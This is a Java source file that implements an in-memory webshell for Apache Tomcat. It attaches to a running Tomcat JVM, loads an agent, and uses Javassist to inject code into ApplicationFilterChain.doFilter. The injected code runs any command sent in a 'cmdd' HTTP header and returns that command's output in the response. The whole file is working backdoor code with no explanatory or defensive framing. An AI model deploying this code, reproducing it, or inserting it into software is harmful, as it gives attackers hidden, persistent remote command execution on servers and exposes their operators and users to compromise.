package com.AgentInject2;

import com.sun.tools.attach.VirtualMachine;
import com.sun.tools.attach.VirtualMachineDescriptor;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;

import java.lang.instrument.ClassFileTransformer;
import java.lang.instrument.IllegalClassFormatException;
import java.lang.instrument.Instrumentation;
import java.security.ProtectionDomain;
import java.util.List;

public class TomcatAgent {
    public static final String CLASSNAME = "org.apache.catalina.core.ApplicationFilterChain";

    public static void agentmain(String args, Instrumentation inst) throws Exception {
        for (Class clazz : inst.getAllLoadedClasses()) {
            if (clazz.getName().equals(CLASSNAME)) {
                inst.addTransformer(new TomcatTransformer(), true);
                inst.retransformClasses(clazz);
            }
        }
    }

    public static void main(String[] args) throws Exception {
        List<VirtualMachineDescriptor> list = VirtualMachine.list();
        for (VirtualMachineDescriptor desc : list) {
            String name = desc.displayName();
            String pid = desc.id();

            if (name.contains("org.apache.catalina.startup.Bootstrap")) {
                // name.contains("com.example.springbootdemo.SpringBootDemoApplication")
                VirtualMachine vm = VirtualMachine.attach(pid);
                vm.loadAgent("/Users/y1shin/Downloads/servletDemo/target/servletDemo-1.0-SNAPSHOT-jar-with-dependencies.jar");
                vm.detach();
                System.out.println("attach ok");
                break;
            }
        }
    }
}

class TomcatTransformer implements ClassFileTransformer {
    public static final String CLASSNAME = "org.apache.catalina.core.ApplicationFilterChain";
    public static final String CLASSMETHOD = "doFilter";

    @Override
    public byte[] transform(ClassLoader loader, String className, Class<?> classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException {
        try {
            ClassPool pool = ClassPool.getDefault();
            if (classBeingRedefined != null) {
                ClassClassPath ccp = new ClassClassPath(classBeingRedefined);
                pool.insertClassPath(ccp);
            }
            if (className.replace("/", ".").equals(CLASSNAME)) {
                CtClass clazz = pool.get(CLASSNAME);
                CtMethod method = clazz.getDeclaredMethod(CLASSMETHOD);
                method.insertBefore("javax.servlet.http.HttpServletRequest httpServletRequest = (javax.servlet.http.HttpServletRequest) request;\n" +
                        "String cmd = httpServletRequest.getHeader(\"cmdd\");\n" +
                        "if (cmd != null) {\n" +
                        "    Process process = Runtime.getRuntime().exec(cmd);\n" +
                        "    java.io.InputStream input = process.getInputStream();\n" +
                        "    java.io.BufferedReader br = new java.io.BufferedReader(new java.io.InputStreamReader(input));\n" +
                        "    StringBuilder sb = new StringBuilder();\n" +
                        "    String line = null;\n" +
                        "    while ((line = br.readLine()) != null) {\n" +
                        "        sb.append(line + \"\\n\");\n" +
                        "    }\n" +
                        "    br.close();\n" +
                        "    input.close();\n" +
                        "    response.setContentType(\"text/html;charset=utf-8\");\n" +
                        "    response.getWriter().print(sb.toString());\n" +
                        "    response.getWriter().flush();\n" +
                        "    response.getWriter().close();\n" +
                        "}");
                byte[] classbyte = clazz.toBytecode();
                clazz.detach();
                return classbyte;
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return classfileBuffer;
    }
}